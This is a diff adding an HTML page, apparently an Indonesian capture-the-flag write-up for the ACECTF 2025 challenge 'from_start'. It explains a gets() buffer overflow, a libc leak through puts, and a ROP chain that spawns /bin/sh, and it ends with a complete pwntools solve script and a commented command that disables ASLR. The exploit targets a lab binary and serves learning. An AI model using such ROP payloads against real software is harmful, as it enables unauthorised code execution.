@@ -1,0 +1,142 @@
+<nav class="wu-toc" aria-label="Daftar Isi">
+<p class="wu-toc-title">Daftar Isi</p>
+<ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#challange-1-fromstart">Challange 1 - from_start</a><ul class="wu-toc-list"><li class="wu-toc-item"><a class="wu-toc-link" href="#deskripsi">Deskripsi</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#tl-dr">TL; DR</a></li><li class="wu-toc-item"><a class="wu-toc-link" href="#langkah-exploit">Langkah Exploit</a></li></ul></li><li class="wu-toc-item"><a class="wu-toc-link" href="#solvepy">solve.py:</a></li></ul>
+</nav>
+<article class="wu-article">
+<p>Attachment -&gt; <img loading="lazy" decoding="async" src="https://img.shields.io/github/downloads/atom/atom/total.svg" alt="downloads"></p>
+<h2 id="challange-1-fromstart">Challange 1 - from_start</h2>
+<h3 id="deskripsi">Deskripsi</h3>
+<p>RET2LIBC</p>
+<h3 id="tl-dr">TL; DR</h3>
+<p>Chall Ret2Libc biasa. Vulnerability nya <strong>gets()</strong>. Tinggal di leak libc nya pake <strong>got puts</strong> dengan cara di print menggunakan <strong>plt puts</strong>. Lalu setelah ter <strong>leak</strong>. Hitung base <strong>LIBC</strong>, dan buat payload ke <strong>system</strong> atau <strong>syscall</strong> <strong>/bin/sh</strong>. </p>
+<h3 id="langkah-exploit">Langkah Exploit</h3>
+<p>Pertama, check file Binary nya dengan <strong>file</strong> dan <strong>checksec</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/S1dy8Tumfx.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/acectf2025/H1_MU6dXzg.png" alt="image"></p>
+<p>Chall ini <strong>not stripped</strong>, <strong>No Pie</strong>, dan <strong>No Canary</strong>. Penjelasan simpelnya, <strong>address</strong> dari setiap <strong>functionnya</strong> gabakal di <strong>acak</strong> sama system, dan kalau dilakukan <strong>overflow</strong> akan <strong>sangat mudah</strong> karena tidak ada pengecekan sebelum <strong>RET</strong>. </p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/SkQcUT_mzg.png" alt="image"></p>
+<p>Dari function main nya saja sudah jelas, ini terdapat <strong>buffer overflow</strong>. Karena penggunaan <strong>gets()</strong> yang akan menerima semua input dari user dengan panjang apapun. Jadi kita <strong>tracing</strong> dengan <strong>cyclic</strong> dari <strong>pwndbg</strong> untuk <strong>mencari offset</strong> sampai <strong>RET</strong> itu butuh berapa byte. </p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/rkX-Dpd7Gx.png" alt="image"></p>
+<p>Disini program sudah <strong>crash</strong> setelah kita input. Kenapa bisa crash? Karena <strong>Buffer Overflow</strong> berhasil dan input kita menimpa <strong>address</strong> dari <strong>RET</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/ry9HP6u7Mx.png" alt="image"></p>
+<p>Di bagian ini fokus ke register yang namanya <strong>RSP</strong>. Karena address RET nya bakal mengambil dari register <strong>RSP</strong> tersebut.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/r1dWuTuQGl.png" alt="image"></p>
+<p>Tinggal di copy aja isi strings nya yang ada di <strong>RSP</strong>. Terus gunakan <code>cyclic -l (input)</code>. Jadi offset untuk sampai ke RET adalah 264 byte.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/SyulugGSzx.png" alt="image"></p>
+<p>Langkah selanjutnya, perlu dilakukan leak <strong>LIBC</strong>. Kenapa? Karena dari Binary File nya tidak memiliki <strong>ROP</strong> untuk memanggil <strong>syscall</strong> atau <strong>system</strong>. Dan <strong>LIBC</strong> itu punya lebih banyak jenis <strong>ROP</strong> termasuk <strong>system</strong> dan <strong>syscall</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/SJ2SZbfHzg.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/acectf2025/BkLIWWfrfl.png" alt="image"></p>
+<p>Pertama, run Binary Exploit. Lalu langsung break aja dengan <code>CTRL + C</code>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/ryesWWzHMl.png" alt="image"></p>
+<p>Ambil salah satu GOT untuk melakukan leak LIBC.</p>
+<pre><code class="language-a">from pwn import *
+#context.arch = &#39;amd64&#39; # i386 / amd64 / arm / aarch64 / mips / powerpc
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall_patched&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+gdb.attach(p, gdbscript=&#39;&#39;&#39;
+br* 0x00000000004011f2
+&#39;&#39;&#39;)
+
+payload = b&#39;A&#39; * 264
+payload += p64(0x00000000004011ad) #pop rdi
+payload += p64(0x404000) #got puts
+payload += p64(0x401060)
+payload += p64(0x00000000004011b6)
+
+p.recv()
+sleep(1)
+p.sendline(payload)
+hasil = p.recvline().strip()
+hasil = hasil.ljust(8, b&#39;\x00&#39;)
+hasil = u64(hasil)
+print(&#39;LEAK-LIBC&#39;, hasil)
+</code></pre>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/SyC0_xzBGx.png" alt="image"></p>
+<p>Nah, setelah ketemu LIBC nya. Saya bisa merumuskan exploit untuk Binary Chall. Buat ret2libc normal. Alur exploitnya:</p>
+<p><strong>Buffer Overflow</strong> -&gt; <strong>pop rdi</strong> -&gt; <strong>/bin/sh</strong> -&gt; <strong>pop rsi</strong> -&gt; <strong>0</strong> -&gt; <strong>pop rdx</strong> -&gt; <strong>0</strong> -&gt; <strong>pop rax</strong> -&gt; <strong>59</strong> -&gt; <strong>syscall</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/BJRrjVVrzg.png" alt="image"></p>
+<p>address pop rdi: <strong>0x00000000004011ad</strong></p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/HJZ0j4Erfl.png" alt="image"></p>
+<p>address pop rsi: <strong>0x00000000004011af</strong><br>address pop rdx: <strong>0x00000000004011b1</strong></p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/rJ81sgzBfl.png" alt="image"></p>
+<p>address pop rax 59 + syscall: <strong>0x00000000000eef34</strong></p>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/ryLc3N4HMe.png" alt="image"></p>
+<p>address strings /bin/sh: <strong>0x1cb42f</strong></p>
+<p>Setelah ketemu semua, tinggal di combine aja jadi payload:</p>
+<pre><code>print(&#39;LEAK-LIBC&#39;, hex(hasil))
+base = hasil - 0x87be0
+
+bin_sh = base + 0x1cb42f
+
+payload = b&#39;A&#39; * 264
+payload += p64(0x00000000004011ad) #pop rdi
+payload += p64(bin_sh)
+payload += p64(0x00000000004011af) # pop rsi
+payload += p64(0)
+payload += p64(0x00000000004011b1) # pop rdx
+payload += p64(0)
+payload += p64(base + 0x00000000000dd237) #pop rax
+payload += p64(0x3b)
+payload += p64(base + 0x00000000000288b5) # syscall
+sleep(1)
+p.sendline(payload)
+</code></pre>
+<p><img loading="lazy" decoding="async" src="/writeups/acectf2025/B1o7aEESGe.png" alt="image"></p>
+<p>Solved!</p>
+<h2 id="solvepy">solve.py:</h2>
+<pre><code class="language-a">from pwn import *
+#context.arch = &#39;amd64&#39; # i386 / amd64 / arm / aarch64 / mips / powerpc
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./chall_patched&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+# gdb.attach(p, gdbscript=&#39;&#39;&#39;
+# br* 0x00000000004011f2
+# &#39;&#39;&#39;)
+
+payload = b&#39;A&#39; * 264
+payload += p64(0x00000000004011ad) #pop rdi
+payload += p64(0x404000) #got puts
+payload += p64(0x401060)
+payload += p64(0x00000000004011b6)
+
+p.recv()
+sleep(1)
+p.sendline(payload)
+hasil = p.recvline().strip()
+hasil = hasil.ljust(8, b&#39;\x00&#39;)
+hasil = u64(hasil)
+print(&#39;LEAK-LIBC&#39;, hex(hasil))
+base = hasil - 0x87be0
+
+bin_sh = base + 0x1cb42f
+
+payload = b&#39;A&#39; * 264
+payload += p64(0x00000000004011ad) #pop rdi
+payload += p64(bin_sh)
+payload += p64(0x00000000004011af) # pop rsi
+payload += p64(0)
+payload += p64(0x00000000004011b1) # pop rdx
+payload += p64(0)
+payload += p64(base + 0x00000000000dd237) #pop rax
+payload += p64(0x3b)
+payload += p64(base + 0x00000000000288b5) # syscall
+sleep(1)
+p.sendline(payload)
+p.interactive()
+
+
+# Exploit:
+# # /bin/sh\x00 tapi hex nya -&gt;   0x68732f6e69622f
+# //sin/sh tapi hex nya -&gt;      0x68732f6e69622f2f
+# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+# python -c &#39;from pwn import * ; print(hex(u64(b&#39;./flagdo&#39;)))&#39;
+</code></pre>
+
+</article>
